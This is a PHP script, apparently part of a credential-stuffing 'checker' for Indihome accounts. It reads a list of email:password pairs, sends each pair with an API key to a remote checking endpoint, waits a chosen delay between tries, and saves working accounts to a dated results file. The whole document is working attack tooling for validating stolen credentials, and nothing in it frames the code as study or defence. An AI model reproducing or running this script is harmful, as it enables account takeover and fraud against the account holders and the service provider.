<?php
echo "[#] FILE : "; $f = trim(fgets(STDIN));
if(is_file($f) && file_exists($f)){
    $file = file_get_contents($f);
    if(!preg_match("/@|gmail|live|aol|yahoo/i", $file)){
        echo "[!] File Isn't EmPass!\n[!] Exiting...\n";
        sleep(1);
        exit();
    }
    echo "[#] DELIMITER : "; $d = trim(fgets(STDIN));
    echo "[#] DELAY : "; $j = trim(fgets(STDIN));
    $acc = explode("\n", $file);
    $count = count($acc);
    $kc->banner();
    echo "[!] ACCOUNTS TOTAL : ".$count."\n";
    echo "[!] Starting Checker."; sleep(1); echo "."; sleep(1); echo ". \n\n";
    $i = 1;
    if(!is_dir("IndihomeResult")){
        mkdir("IndihomeResult");
    }
    foreach($acc as $akun){
        $account = explode($d, $akun);
        $c = json_decode($kc->curl($apiUrl."?Uname=".trim($account[0])."&Pass=".trim($account[1])."&key=".$kc->getKey()), true);
        $result = $c['result'];
        if($c['type'] == "success"){
            $kc->Save("IndihomeResult/INDI-SEAMLESS-ACTIVE_".date("d-m-Y").".txt", $c['result']."\n");
        }
        echo "[".$i++."/".$count."] ".$result;
        sleep($j);
    }
}else{
    echo "[!] File Not Found!\n";
    exit();
}
?>